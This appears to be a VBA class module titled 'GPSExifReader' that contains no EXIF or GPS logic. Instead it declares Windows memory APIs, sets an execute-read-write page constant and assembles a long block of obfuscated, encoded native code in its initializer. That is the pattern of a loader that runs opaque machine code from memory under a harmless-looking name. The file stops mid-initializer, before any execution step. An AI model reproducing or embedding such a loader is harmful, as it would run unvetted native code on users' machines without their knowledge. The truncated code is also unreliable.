VERSION 1.0 CLASS
BEGIN
  MultiUse = -1  'True
END
Attribute VB_Name = "GPSExifReader"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Option Explicit
Private Const OPTION_BASE                  As Long = 0
Private Const OPTION_FLAGS                 As Long = 2
Private Const OPTION_INCLUDE_REFERENCEDOCS As Long = 0
Private Const OPTION_DISABLEDCLASSES       As String = ""
Private Const DECOMPRESSED_EXT             As Long = 30069 'older
'Private Const DECOMPRESSED_EXT             As Long = 153574 'newer
Private Const SIZEOF_PTR32                 As Long = &H4
Private Const SIZEOF_PTR64                 As Long = &H8
Private Const PAGE_EXECUTE_RW              As Long = &H40
Private Const MEM_RESERVE_AND_COMMIT       As Long = &H3000
Private Const ERR_OUT_OF_MEMORY            As Long = &H7
Private m_ClassFactory As Object
#If VBA7 Then
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal Address As LongPtr, ByVal Size As LongPtr, ByVal AllocationType As Long, ByVal Protect As Long) As LongPtr
Private Declare PtrSafe Function GetModuleHandleA Lib "KERNEL32" (ByVal ProcName As String) As LongPtr
Private Declare PtrSafe Function GetProcAddress Lib "KERNEL32" (ByVal Module As LongPtr, ByVal ProcName As String) As LongPtr
Private Declare PtrSafe Sub CopyMemoryAnsi Lib "KERNEL32" (ByVal Dest As LongPtr, ByVal Source As String, ByVal Size As LongPtr)
Private Declare PtrSafe Sub CastToObject Lib "KERNEL32" (ByRef Dest As Object, ByRef Source As LongPtr, ByVal Size As LongPtr)
Private Type IDispatchVTable
    QueryInterface As LongPtr
    AddRef As LongPtr
    Release As LongPtr
    GetTypeInfoCount As LongPtr
    GetTypeInfo As LongPtr
    GetIDsOfNames As LongPtr
    Invoke As LongPtr
End Type
#Else
Private Declare Function VirtualAlloc Lib "KERNEL32" (ByVal Address As Long, ByVal Size As Long, ByVal AllocationType As Long, ByVal Protect As Long) As Long
Private Declare Function GetModuleHandleA Lib "KERNEL32" (ByVal ProcName As String) As Long
Private Declare Function GetProcAddress Lib "KERNEL32" (ByVal Module As Long, ByVal ProcName As String) As Long
Private Declare Sub CopyMemoryAnsi Lib "KERNEL32" Alias "RtlMoveMemory" (ByVal Dest As Long, ByVal Source As String, ByVal Size As Long)
Private Declare Sub CastToObject Lib "KERNEL32" Alias "RtlMoveMemory" (ByRef Dest As Object, ByRef Source As Long, ByVal Size As Long)
Private Type IDispatchVTable
    QueryInterface As Long
    AddRef As Long
    Release As Long
    GetTypeInfoCount As Long
    GetTypeInfo As Long
    GetIDsOfNames As Long
    Invoke As Long
End Type
#End If
Private Sub Class_Initialize()
    Dim NativeCode As String
    Dim LoaderVTable As IDispatchVTable
    Dim Ignore As Boolean
    Dim ClassFactoryLoader As Object
    #If VBA7 Then
    Dim Kernel32Handle As LongPtr
    Dim GetProcAddressPtr As LongPtr
    Dim NativeCodeAddr As LongPtr
    Dim LoaderVTablePtr As LongPtr
    Dim LoaderObj As LongPtr
    #Else
    Dim Kernel32Handle As Long
    Dim GetProcAddressPtr As Long
    Dim NativeCodeAddr As Long
    Dim LoaderVTablePtr As Long
    Dim LoaderObj As Long
    #End If
    #If Win64 Then
    Const SIZEOF_PTR = SIZEOF_PTR64
    #Else
    Const SIZEOF_PTR = SIZEOF_PTR32
    #End If
    NativeCode = NativeCode & "%EEEE%::::RPZPPPh $$$j PPPPH+T$ t5AYAZkDTX 5^Nz{L3TQ@M3LR@A)DR@Xf5@@fA)AUXI3DR@ZZZZZZ?!, @RY3LDl3TA@PY,VH)DJ@XXXXXXXXXX%EEEE%::::VSPPPPj PPPPPPPP4T)D$04P)D$,4  '4 )D$($ PZ3D$@+D$ YQ3H +L$ XP3Q +T$0XPf55nf)BUR[YQ^VXP2Cf<0tF1+++"
    NativeCode = NativeCode & "aamX]C]X]cfiXknpBknpCDkfHecCn[_S;e mDF[\Ag mDx OaOoRy>YHES]^Alc =SS =qiPxQS =NRvE?dmm@oWhI hWX"
    NativeCode = NativeCode & "vATjwAU;>LJ_>LJ^xmBHsS=wFBvoIoVSH>NtHoVZXWZ\HrBp@L=fD ]X;L=ei=]k;YX@gQRHXnDLuO;sw>ravCxWg[_UFCQAxwNIwaEvH^pIxTxtaW=K^iBvG;GIyDxk@euJYDp"
    NativeCode = NativeCode & "Bdd==[R>xxLAGEHCBgV==Xanxi^QGVhsBRWM=RWM=S_sTbosT][qQ]TNn]TNnM\XercgZmjqQRUNnuPZmvlRVvu UGE UGLAPGLAPfDW]X;hh;>>aBwhl=HW]TLATUok=w_k=UF;xjrx=HMFBwxDGUf;xjRh=JmVBWlUzvtyYIKDMwCKrVCwcVCv\w[Z\HdgHvlhwWlTeWlWaSRsaSRr CZek"
    NativeCode = NativeCode & "T]^a MVw_riI MM?IOYMAh][JrUMCMjspmjluNuSJsJAOQT>pna\uL^cJldBOqtEwPlqooSY;NJ?DqtB@Plt?oSGK+++"
    NativeCode = NativeCode & "rAjXF;zXF;zVfjbzf;z]FjfCVjfI^IvI^tn[[VqddtIUaJ>wdiaH[R;Y^R;RtBb>tb;Xp\DdHMY;wMX\onH\oSPNjqOqUSsPPl@rUO?MjMCM?]g^HpWb\aOE\@Wj@?hVx@ YGBgmEMozBrPD=rPD=q>h=?w>z@IAE@IADaQmD^nQx;w>GDIC?>eE@[uI_dJugZgrXZZQoOBw?L"
    NativeCode = NativeCode & "swEYvUzfIjLD\dr;cODpaWLfjhsYUq^QfSOSolxQzNgnEqQ\PSncolXQjLgnUPVmmqN@iNp=YkiRfTVoJv@tupEbqOz]NTrKEkMtzsDbqM;]NMpAA AoNs_wiL HUhVo_pyP OE<^GKCq@CSjHTTUwkkUwkktoGkKPzGnHUxQwhPaTGoDlJ DlJ ]d]kb[bTyRt_FmJ GfSojFom+++"
    NativeCode = NativeCode & "[]BNR?FXY"
    NativeCode = NativeCode & ">NjYqVIr sQPdDvr YADZVNZ>HQDq?XyO@Dpv^UH[KRduB[KEKLMrD;DelLm?Jm"
    NativeCode = NativeCode & "vzQBRqjsCrvrd i\vz"
    NativeCode = NativeCode & "=HWG[ \?lHnzbkrnTm]HruN o\Ej;ZQAjn=YwSiBexAs@VbrUJ[wEdy>S=nRZR<@OYnD\WpVDl;Hn>XZfm=]Y>x_lPlP]YvEc=VzR]iZv>>dBTwv[cFE_S=RpydIEBXzlqG]EJID+++"
    NativeCode = NativeCode & "kSkCJUENE;TFzmXvDkFrdDvPvsSC]dJQzV;G^K]VyJWLMk_=ZPpxdxl@aYtetvsxjrwu@gVv]hQmTPDcDcb+++"
    NativeCode = NativeCode & "EOxMJFnDDrRW_Rq]CL@Epw;^F_HSJrfws\?p qV[>_fmtubQkhFMXaa[Pb[XL_uHkXxU\k>wqOaQHXftduaFiVXxLR?sPvDniVJo>pII>go_Xgx?_]xi\A==J@i=^ViW^C?+++"
    NativeCode = NativeCode & "UHC?[x@c[xgcRdeUndKPOokRwwj?fP\]NLI^RYKyn^taiDRaU;C]N?_jHrtd;jhRmmeswWPdjN>I_mDxjt^=tYFGNh;_ujO>+++"
    NativeCode = NativeCode & "ikN?DF_@hIEwojfAad>y\OaORbzHBBw>nA;^MwcW;P\HHviiEZkrEZMBLAYrz;g VcMzWt=oBYxtwUfD\OURjIxsKc ifHdTc>P=oRBfTVtWOMa>y@MUZ[UcImXN_cneBOh>+++"
    NativeCode = NativeCode & "V;YNUWYSuWDsv;VtZy;]YTs@x\o ;q;fWRMSR?oXJgMnBLUOM<@bey[csgkv_MeGM;oH;qaxjGPi\PfXqCAWWeWvhacqxegDepggNzcLSbO_>Is>A MEBg<@\F?[NWI_Cjh\[it>AYsE[B_DurX?uthbkVKx>?=ssC_PkbRrmyRT[I[xYG@y?+++"
    NativeCode = NativeCode & "aZYDllPotmKuvz;pZWzkZTW=EvUPouy@rYi]PZEHOyFedzk=yVs Zs^sEkLEqoadzPyvLAtKb;BrdQkvSUA^]?CKIZVJCo?tcCTWg_ItDBjWhGf;tqRTOFowPPbHHJWm[_mQv]^WLFqeWzB?jU^@yfNYkvSopwwQCnVfN+++"
    NativeCode = NativeCode & "T;hcyGF?gf^YiXc^ts;]QTLg=fT^RATH_?CH;@tndzGbJN>LE?_ssG=A^D_c[dn;TLGuuEnsQ;>AWB^aH>"
    NativeCode = NativeCode & "jpXlNXL\I_XFqYsoXAC?enobeYOP;CvLAnkAFQ@znfk;VR=jl\WsLnVTExlWAxsF^@U>xqa>\hl R>Q>ZaKRXNTTPTHujEyqAdTuAYOuB=pK\hEwI"
    NativeCode = NativeCode & "qvOpeIOAY guGaDUPQ;fAuPBG?ULF?e?Xh@RJrhzR>nt[D k;rvkc^W;?aX]LfnvuuGRgfo_fCGSO\mpInBEHXJSj=zg=aXPIeHw\aRmsxrmB>]iHj?@fcl=vXWV VwdNO=]l?dASOlbEPb"
    NativeCode = NativeCode & "XLbedLJoGPZCPs^UpyKGNitek?fbsn=R_hePiqgQ?dGk\R=>WFJqQXG=?JOHaKMKQzl=JBkv]aKhppSPnt u]IAkAwM"
    NativeCode = NativeCode & "xtH[kmUl;^TJtmtBHs] bZvHErNyG=OvtrAhG_uTHvWP@S]wHgswdk;bzJcqpykcm=SnjGPVHWgVuqwKwKBN=@ZV>Wr_QH"
    NativeCode = NativeCode & "nGbSzSDu^ AJUVISMtjaGQCuQrxio_[BprxLAdY>pPM@K> WSuUyFrYVrMvZC>Jf>=FZLRHik]T^dAiPy^] ljaBN_tHJKfoCQRyHHsmLkAmZvqL][STtyaCJZ O LmvE<]>DFC;qQyM?FEMPdyWWmKmb ]rbHVeZXRNNosrlZ@rzci??N"
    NativeCode = NativeCode & "dsQnsm[B?[_lBBUSQTqjr?saAGVRRlBLzaN> BNHQNd cTTRUb^_?icOLBpq=ZLawaoUGTjjgL^LBvg miF cw\hxPuu?\^nMy ZglKVgTJ[v[RPVm][ ydWLTbPbG^Ang@Bc@mgVevhKo MxM[<]>MxoQV>qmp^zHCnevpK\sdtoRezx;Jv_L;;FdvVfrqnwpiBtnJ+++"
    NativeCode = NativeCode & "QNZgTiBwrTDNyc_h\_MRQods^wu  tnjOinDmkpcTGHItqughDD\Ajg_?w^iYfuTJAzDmcn\Vd;GKHIemOYXaEw?[<;H_>d;>AFfLHjQPuwi;OPcDPKsoXy]cSoewZ\RaOzqp\G?GsDhj?hz^bCUG>ljvHrD"
    NativeCode = NativeCode & "vZL=;vUY L@xelsxM?VcmEMj AJ]joKAS\U>xGhUlvzxpVLGEmeBuIzEpeowrQRozi]wrKXD_rbT[ciJIcDnrSjWzhN]wzLFhuYI@pwxQBkidT;cFf_xEGMkmq^NdWYMcVuyP]Zg[zMd=Qs]m@cpr?gbuvEQGjCImGyGxyw<YTGXBW@GkHzh?SFmsu;JsaB]UN^g]i=VB+++"
    NativeCode = NativeCode & "e^]VAMWl =xOXLCBifbnKn^FaOU^cyjD <yTyz;>_qe\GZkl;ZcFLj[wifStvl[iVG[DgGp +++"
    NativeCode = NativeCode & "cQ> wLhqoa?WmdhvsfoKGdJkvWua[hUE Tasjp\W\NNCo_Es\AZpPOGZ]JwirED^^  HmDj]TqWnCGuOx@^w=CQFejYSMawp"
    NativeCode = NativeCode & "VH=fBNgtARsuMFklMziMwF^TR@cp_CPEy@HA\e=cV>t?Jy>fW_kMmc=F@@kkVGNmdsYIxE;y u\jyvyZ[;B_oQoQXYmjdr>BoFwuIOuh[ n[JwDkNkJixQ\=\oU CTh@]];ZqrJ]U\qPqLGv^AGsS]L=_OKoHCOJ"
    NativeCode = NativeCode & "ehdLj]odOoraEFmKuJuy]m_JRTgGhPoyOVf;NGDg[ZicUK?ZqN?tPnlRJc=hB]qqhILGXXJ<[>dTYIpgymJDsiXQyUD_WHWBcpjhy=lhpbT=nTQeCAykXVzX]>WpWUVpoWj]sO"
    NativeCode = NativeCode & "]^=zUnf[=]djUOM>JWIsyeIhWtgqhrJkI\QALH\CoysQGxIDEW[gcUBnS@^PvGy>NGbpKC]Kqz^UtiCe]=ANwW[COcQ=?BG=Y=fNCjuTFalyDdaS=OPkFBd]o^UZBr?iX=JOl Sc;zoI>mJWvt]MWQzhDOe;fwJgrxqdiodUxxj_fY=GBJttaeVX>sRSObUxNix]LfZpNkbk +++"
    NativeCode = NativeCode & "=ku_KbA?t@bb>hRp?;fsQ[^?>FGFHpMnUcVMybbIY>hAJ jYcm@M\xZpKtsct\>DV]H[iWbF[zi[KV\SMcnYhX[L v>;tSEO^D=ENEG =A?]TSUr^uycqmypIivujho_TcOt<@swCVlCgkiDWmeLrkcNY>dqwe+++"
    NativeCode = NativeCode & "@Q BskdmFARFWwygsTXCYzw^hsubSPVcyQhuRrZHMZYe\JRuUXYXdhSTaPx?iXjuz=Xvjw] ?nAEo Shxw?t^EEGWAhSYTqNOVCqUyARpVHX\@]NAP=[X?redZOoVDZJAP?^FKCqXcMLfL@sYIXfK@T>on_nKWfJBPFSRtw>jjkmEo[@[ OVts+++"
    NativeCode = NativeCode & "=weq@^Bh_\Hj=xmLcEOUkcLJBbiYuAmINWE DKT\OurKy^gprMv;]wCP V[kZ=h]jYVVxOOqQRLanjhvuZPR?A VoYgkx\BReGUPvQBjRG=GhX@D=M wUY?WMuE=bq\"
    NativeCode = NativeCode & "teMYbliO;BvSinddzjLphp;RH?vqce?FKvWzIyVGJ @z TMGb;oKvnJ CiEDgDNo"
    NativeCode = NativeCode & ">dK>[On>J;dbdZYIENWQrD VWFj\PUhrpyClEbRh[sNeBlo"
    NativeCode = NativeCode & "q^IMhiF^@c>kSj;Z[mTLz Vhe>EyxWWzg?maLFAzi[DBTSTTsYcRZRD\\X=gzRMdtadMQQuF]_\uOWwSCsbONqoTMLYwkm[Dn P"
    NativeCode = NativeCode & "[\_YvhdX\]s_hPIkGKDe;XsQ evz[FGFKIxk\LGknxMIISihF\WIyiZJ@HpyzLp;?nuxdIKhlRYjeUKK_kCyX[luzevljEmdjRa>rp^WuucaE[<;tMSAx@;gNiLzLXyc< WeiSwHNk;w@;_BBMCl^AU^vNuMGqNJ^=kfGNjLxedUO Dov]trp>h>?]TmI]J O\=y>eyZILh][sA>GE\BBguqN+++"
    NativeCode = NativeCode & "Mu>GqFvghRo MsvKrKS[?W?bx\ijrrTeRhhj^?myFDpW[G=Mi;bGkqG;RfF=YYfTuDC\G; GGdlKN?fOubTSgzc]jaOeNJa>WTxcfEEb=ESeTYUXjZke@ywXQO]sbc"
    NativeCode = NativeCode & "PX?Hm]HUU=ZpykkeG_=gbhWWta=zDL=[\>Bnseu@d>BYZk=HUEYvrjGDKMJ=Gtlq?HWVNApZpIg\NrXhTXrdZyJEsheQT=ovr\NtVEaP H[vvEaV]^QqPFf[C>Qq]n QwhbA_ jXH>]kV?rkNprrwajyAGhM_SzHPzs@^H_Gbhg@;tJaYN@jTbkoy@L^CCPjosBunte"
    NativeCode = NativeCode & "[FXA]cGMGwQnUbHmrALcoke?fbGXksu=ENSpw=v^kDEjuegkQtVLUVK;aMHCRGQqWMJK_\lRn+++"
    NativeCode = NativeCode & "KN^ClrblPuV^OxY_=jNxAhjlym^ZdxByNdSxGmRfuwZHFF?q\[[BEyKtqlXyW_s\SsJxge\UTkWbqZO=XPK\MiKSsyHiDSW@>?=W\ z EjzBlZdbQWS=@gzgqsFwq=AvmZgxZEKuj_=qqlYjWgDIIFGNX>n>f"
    NativeCode = NativeCode & "rw@[IFnsJED[auMnwfrNVr?dukyAmbJiAzoqeBG PIgnGHuI_hk^RXTXA@lAMyAKSYgBBhXQ^zWaB=XHlDFEW=^c^YN?icC?>rEfv\KYnzB@qVt=qaB;SreKl>OB\r\^BAAKhFYRaOZjVucU mpS?STpXkOStpHpl]rjmKRpesxOAdaioUuFD?oY^kG^T]dldYYJeodrPqB+++"
    NativeCode = NativeCode & "HoZqV_vsRNYfsznk\A[Ixk?lXr]\ctlF\folBSdXlly?cwheOlxxVkIx=YxqTFnrrhgA A^uzWTioz>DWp[RMeiFxHfAfbK[KPWMqFT[lT[JA S?NpCRTO@Gv_ZSQkzvVd@gWiwOmU=?LlZOjT+++"
    NativeCode = NativeCode & "fDPujPPIxIOI]NgGWSaKNkgYP^elIsf;L_?i =zbNF[acCx>pns@n>Ro\tT@ QTqorXyR[zg^d]QovqvvLWxYpHICpg=AxIb?\L?Gmt]c^GNFJ[gAVpL[b\bz]Nsgh[M;AEG?=>nVN?CLyWymibINA [N\aoWtHgnNadgQr+++"
    NativeCode = NativeCode & "Ey_GqCZA[a@NlMaRQbFQqqzuJi]iSaLMEfgoSUb@zCVtWfOpZ?J_caJf=^QhwtLE@iCr]nnwnd^\>LDL=WeE;xw@yDW_fhgBuNaIhGWUk+++"
    NativeCode = NativeCode & ">xlLoUI^Ml@V]DiBjM;X>]Pv;RPyF;LHlsUu[eHYBVPvDwcI@_FQDWKRIpIwgF^qPk_]wKuWfvvK_yEAWxgMsRgiMsxZHnurhU_x]^yFSbQnrnQ;AFoxY^?;qwBZ=rdoyHV KM>ukKkkmztT]NH D;kFjPZDuhhJ^wb;keyJ^loV"
    NativeCode = NativeCode & "ZW SmXt>WTSoGpNDOYB\SqfkQPIvTwIUt]ak^VeKeRDHDps]OIbSbNz\GJlCHRDp]GwiQ_H@hZ\EnVf=RLCypP UMSRihVDjmqVGeLtMboaSURy[?K=ek[JNlKEJwiOvpssDwECw;EqaurEn_qLvmSUnbV@>OF"
    NativeCode = NativeCode & "D?rN;SfOacFS]KvRPOlhjx;kwc^i\eZ\zj\hc;ioaVh\oqN;HGC__RS\Q_q=dqv]TWf>WziEXtFV]UcqmgXtrFWd=cY^BhdTWKbRomF_>I bfQI[JfE qvbcIBasWec+++"
    NativeCode = NativeCode & "B=SJrsiviBPmKHXVW_\JzgtuzQ\Mm Xdj_\OIc^jAl_TIPAR_[G O@jdXRd_==HGHILoT=laY_tEdW==\PyF>XvPiJuNRHnWqrLq["
    NativeCode = NativeCode & "K=quCJGoHI[kfnW@h=BMsdweMtxamoH eKxTvSjTlwzHG sIZ EpWTsjcScQVm?qzNZNLGnE_DRfEConHUKBn;Sb[X_\R=FT]xUyvrC[Fmv^Cnv@_Sd KyL?J^L;FzFvX"
    NativeCode = NativeCode & "SRaNqM@iP;zUu_dG=dtCUbLGhMtjS<]g@Hq>]rbC]loIHagutaECVPirnp\Q_lkLNnERSUeDGIxKZFpdeU=[ymgTe[cnUpBIvKn_rYe@mU_AvObY@>hi\hw@=>EFxOOaDsjWSxv]=SeD>Z>^]Jo@@M@>yUdCA;VcIGqwv>Gibc^VOHoh^G_FfBPhRFCC>fx"
    NativeCode = NativeCode & "Ai@icBkyaYs]lu\X@jRyly?PTM@SaQtG=;\ago^hA;WS@^Yw\DceRgyYpMeZyzqknae]GJBQcl^KlNpn]rwNHVZZbTMA;sVQaRZcBXkQqwZVHSF<]zUB\SpjW> xejfZcBSDq]XGG=CH\lnMrwJHlfsTzt[euZ_Jt;JkPzZgiw@C]kNxOYUB]jaCWD_=RXoaucx_fiIiiCp<+++"
    NativeCode = NativeCode & "@=eBm=OAnqPXPTOPodMseB[AJ[AtDZh \QxymJJG^>WDUyZ>ZamF[utGKnS XwG A;xSJ\NJPjH\ysDoWCsal_GAn?]gXHi[nTmfnrKbmtuKJdxxWge]bjDOfperiJcIio^a\\ePG\Nt\gqaKcSobxMzVtCaJ=pIBbLtjFhHquegdciTYT[SJ_WaMjdN^nOwWRJiT+++"
    NativeCode = NativeCode & " ZJnmO=qgrz\>^qiMFg?vgtHioc?tSYPXuceGPwPNxaSN? rIXlfH@ZTsHZpFDo h\udDNotU?^N]gw^^Qkhq_ns[\ZBIvNzqfOCS"
    NativeCode = NativeCode & "qsQmJNaF;ftTAoDWC]_HYPCgmo;Tp@yi^wvQk=XpGtCkjQDxHbGtnrYtSPC<]FSWdy@SWZiEO=PiCIei^E SEzvt?Lp@rm^>o jAnZpx;"
    NativeCode = NativeCode & "xTP;@XMYOWLPDDu;jtZCUdNyN\rE@\d@fevTLDdC_=>qx^CCAYcrxtRtfYz;OJDRwWaEmLsZ^p;ejvsjyaAeei x?"
    NativeCode = NativeCode & "rlJ@@j=XvmUgil>iz?s@?nUt@O xVamsETyCMDsZGhWoQzWirVapFIngsl\b_z=y^QPXl>[AIeMrPPa]ZFRQh_uJ=o\LVyxiiT?>aNv dBnzRqOGICPao_FPSBUx@IfBvgITS [gQ=dSJdyWQhG_e\bz n^CzxEvllhcvfQ^lPKudf\RytoHSe\bxVSwb>q\tVW]mlJrTyeyyQB]^FHMJMdq[W]Pi+++"
    NativeCode = NativeCode & "kyis_PHTz^ Bp@_yqiHFHwWyvbhIa\ ffbfOY\mEPjsvkQLOTmhj_dvdJ"
    NativeCode = NativeCode & "UWSlwLcYCdHSvpb>uCfl_tlaG]GFS[ixF CuZFEWx^iFY>xp;TaEnxbr>pT]HtGbtcFlKLXMBpIifIFip@UVzXSEYeFuGUlKvTGJqeg?pRP[U]lNz=UOoFgxkVWa@mF;lznGmjsCsBxf^qCWhogWXR\wXVsOz+++"
    NativeCode = NativeCode & "W]>b^YJaC NCLFUEa^FM[geEM[]f>OhUSuIl>x>kQPm PehWJ^K\P;QdpoNZxK^JD=JcYw\_CQIXR@ikNLHxCKL?]BGKH]YfYtShNtjBW?QHfuYFFqqV qA_sqLyOYN P OcDR^iNDw>kPebwiy[_;eQ@WB]ee^nud?bW?@VivVLpBpx_gz XLD;vASzRsJtRI@C?ZiGYn\CW^dhM KD[ERsOdlcS+++"
    NativeCode = NativeCode & "  ^plzxPEJ[Tu=z R@ZVR=Y>@MnJIK>tQHQa=qTbRyllshzBkwl@p@bSk PH^Bj\^m?bdeHRdCClbfv[FjEN>=pixgYnptz?@xQ>cJ=^uMIb>hFHGiA;KBWz=l@ZZDrRwMrKRb>bezvjUSxD\\hdukDcJ@I?eHhiC?Q]rFjYAL\IeKDR[=+++"
    NativeCode = NativeCode & "Kly TxlSForzj>NkbTH\BA_cBudollm^S sVfMEAm? shvg]prqBmnUkHMfnm\[Twvd_NW>@gBKIEY>WDorcqc\RqaAZvyveNCeWeuAd^PgmBRQjVAY__>^R=x?On ZPPlhBeJt_rL]W]UgiS]WUj@FmBX]>vN_^uq@IDLTc?eNl\ge]fjbL_iszwOIdJTOjI;]>nMhpiPQHNQX@?waquzcYseKcJ+++"
    NativeCode = NativeCode & "IbdsKu]oxH_wpDEixyeGuxa]aoBs?CRkNv>tmWVCITwweEecG[J?UgbImyrW>@SUtdGXItoQBHgCX_OFNSnCrI>eymdoKZnnPPpI@QK]gCH;mEuIu;smhCzSJHBeFNBxUSx[Wc;WSYVkPPE=+++"
    NativeCode = NativeCode & "BK=a;VEszVOKGIymPTPgN@=oCOIWexic]UgyT;SZQJ]ZSy[GzMeFmiQt>ZEZfZGnVp>pp?I^hTvcLYsxFAy;SFaV@JMNpohKVUa=^ryFxFeiMNxQXch>rYYDiJDM>l@rySC[W_O[veWdEZvVRrmVsrx>RLmUMM]\GyS?RtI[wb_lwKw=Y]q^D>Ln[kKAsZOotN>?Ni_ LZ^dfBZmaJotqtvcmwALD+++"
    NativeCode = NativeCode & "hTiMTLIs]ZVGrlzO?x\MRnaG]@tVq_R]B?vb\tFMzULJKCGYWhxtTNQqhDFECl PT_FaPLQpVyoWZ@ZQS];]VSVegYTRIl>+++"
    NativeCode = NativeCode & ">LMKGfKOWLLbzbz?sZllSdKWSoWBibyO?d=a=hRYmMbrGwme^]_v_CWakUuuN]PlaHw;USwewm@=El=Awfmw?p;pY>VKf f] sXaTws>njc=YmYK<@P@c_BX>xO?eq[SrTIGhKbek^LXBtUm@vpgaDaEzN@HA^uUfOJFHpTlQD[;m?iw=cfh=kIL yZY>FmaQ?W^Opxq_TCMOm\cRE^[RB]wYcyH;+++"
    NativeCode = NativeCode & "zXZChBf[s?]XVcW_GHvUzZPAbay_[Q\]QAIX\EB ^  dumeDS QWGUIFYsoVtWtZF+++"
    NativeCode = NativeCode & "zUJWBEjvqFaA^EbBRbrgQiteITO=sELvm@OBd\ M_K^bpjDzBqKYI\xu>rjNlSYDHjQL^bzt>Y?tbHhaEWm;_bTSc]>iBFAm[ZjUrxTspsUwKq@CFb[myAxfEkkaRRWnE^meD] prPcX+++"
    NativeCode = NativeCode & "=q\bVbaq^TZYL yPik PIlr<^RTApJ NN[O;[itbn_OHA@[VcLJWw>d\DV+++"
    NativeCode = NativeCode & "UiPjj@QmNamk\ h>w\E@xzY[fBGpdkmtNQnzGFMPPFl[UTCcHHAeaGQGiMhqJKUkIQkYv[KDHswLa^qOEeTstIYpp@A N\ltwAgqFIrN_pyqGZBaAxXNHC@_E@SojIallXP=UnvQ^q[ZValnfwDCRkw;L]Pbf;x YZVAZwSV;BQ\YBSuxsSDwbSa+++"
    NativeCode = NativeCode & ";vZ\HCxsRzdapvHFyz\KgwC@h\uUtYuMdZHoicev dFpGysr?SeqsG^nw\Wpfq;azrIKHOgmnmR zwqWSUqQ?^ZheKp_UlsLC@=hK\[yPPztXGj@c^;VyniMhxQk_"
    NativeCode = NativeCode & "ijS;Ne_vbZWorpjTqwMczFlJ=a\d>FyQOtvL;;Im_aYOsQljvOJF^SO__@tIi;sGj=dZmdNQD?kSiZwRuZdqSCzHTkONsfWhMVX]GbbrnVQe\]\KudwfhWJuTdO \[pot_=E?f>Q]krfNXa;PDlUY;uaewYJR^BTc\VJA^\>p\Ly+++"
    NativeCode = NativeCode & "sikA^jmRfZgW_rFoFOvULw>n\pHe]Yl@=rzolK?F\kdDE@aE?lNxNHInf\VK?WgoByza]LPfSy\?jthPXzl>MlhMYaftvkGS_n_Kk?acuiZbZDd;=x\UIIR H_Cooza\O"
    NativeCode = NativeCode & "IN@lg_>N=Kcn[fPhP;>JgjdUFMrPJJkM]U^aby k=OiR?VmCj>rl @smIcIBI^ATLX\SCr_nmVKAsNYoi zljYj^ILXPw>Uf=_mPqYZjG_pP^CILTXKDBZ]jLrwAL=eGgL>p\=yqCqUWxxmTFC?@Ak>vco]xjKXZY]dikyw;DEoWBJk^dxI_seQtETL@tSbBGY>T@ao;eUcqdgYYjf?whJQdDtRz>+++"
    NativeCode = NativeCode & "=Y=q aglZRA_svLy y;vGrjxaokVz\AwTViMgygdr rb@;AHJCkkX]uvJFgcL<=kBghdZhWWtmZB@  UQUR"
    NativeCode = NativeCode & "UMApOMbrt;rstfhryEZruLCc<]@il_cNawMLuctGtFPwRMkzOR_DX zB;W;wkG"
    NativeCode = NativeCode & "xeLNb>aKNsCaYDXEjCEIDUXFgpi_TfBZ^QnSlBZNBLZ[wdPX_oxVPskNZB?AJi>rcmDpGzOJxiRvNKBgPdpXRfFP]>WFBUkMXJh;QQYxl]UoNOklcdNBRcbBMMrHSbqLAkdtyKfN[rZwuKEau_oaLjOcRKL^beh_fKtReSE_Wd_kjQe=MpVhMeLgSF]]J+++"
    NativeCode = NativeCode & "SW xhpgsi[thwOAiXVleFVkTKNkMXz;vFEbvsIGTNKMRIzYeaiI^^nrcxZnH@tGvPCFWglqbL=PXh>TX?W;FnfJ s?pkT^GIUeMu]lkQQ]PffNXDoHp xMg>qXS?BS[Bh^U CJPF>O"
    NativeCode = NativeCode & "hbVUCbK>olIT=niba\e@=hh[ICE=>E^@^k[kO@wnUpj^yjkkFORELxL?v[eazswEEZpITYdOL@S;[_ybcaxWgXcZbrkUU?WgVhURdAHBgG>BaMIBgr]T? zZnnx^ncphKxG[ZbmD[P^WQRSwo_G\vZDOQa>LvqCIGy=@=;uwLkTsIgTtRoSYsu?tD+++"
    NativeCode = NativeCode & "zuz]vHpPkW_ saATHjyRUdGSwZOQCEFRUn@\rURnjqLaob;XwY=rNNul@TGVWrhuoWDemTfnQzYXnBVXnT?GGq;TEvM<^O]QhXqXhMHX><^Fa_ZzeCRPAEo+++"
    NativeCode = NativeCode & ";LgieqqjesEk[wQI>eqDs]Tx?[KRfLuUSJisgmCNvDitust@Q=Aa QGzRTbgIe"
    NativeCode = NativeCode & "Lhrkr[_>B?f=fpernKf^v_QAcMCt@RjxgX@>ClptLHYma;_pQ?qriMfsfvofFTwXRilPDFXCYld=TElAdGUrdTsaSkAhV=qBucxASSzHhrWa>cAlkYxhezod@^T@oQ[lpuBxB \MS[;ervjDKA^CnB[?Rcnx?puogQ@OQCXsL?Z@ZExtysgarla+++"
    NativeCode = NativeCode & "e_c hGMqaD[Q\gMANSHHtvPzV\jWfArE^OvnXHRjIVEp]RKRWVf=RiOZjYDPTKa_\ssmFR = PpiuyMxdeolimV^nyKcZylqQ?i>;cy;mntpki?gm;=ieIT wPmBOuNvb_>wTx?SaPlhFK=[WZaWtmhrWFqMKBmbQkcl\Bx;z_F= FeQ@sAdNUBO U?xeIGYAvM+++"
    NativeCode = NativeCode & "JbxziTP?FfzMQ lvBeryUZZSGfEMz]laQDyKR\bAPZoCS@JgrUX=iyoRloZ;apa<]QVeIJaOT jZiVU?MunOjHw"
    NativeCode = NativeCode & "l=BthHxuO;Ic;rEb>>Tdx\cJj\oQPlqMf\RvJn;[ZwCHgV\;x[^wui\oOnhfdtheYkursRADZ[_VRKhu@rcLl;Jr>O^@ONnMEet[LZSu?EV[ayPZIqTukxrHKPnpNEU_vtGEpwZkfKgNzWE?uS;Bq^[gOhOCi y[GSbGR+++"
    NativeCode = NativeCode & "BKN>HPdM;mkWnY;AX iAY ivi>u>xHUOQW_InHKzYpwVWP^WBSRfh^e oCqlUnS VCz;Futhv_gYtnlcUxE]UtVY^?^oMrMNWCUT\dCNGZibe_RabuCV?Xmq\TwNlCO;Oaf zCJpQejzt^g;dRBq<<_zryMFrnddrIOfrSXJXSipl]yDyiCODlQoaDfkqkZb\gWWC=u; CrgkBn \WwPx+++"
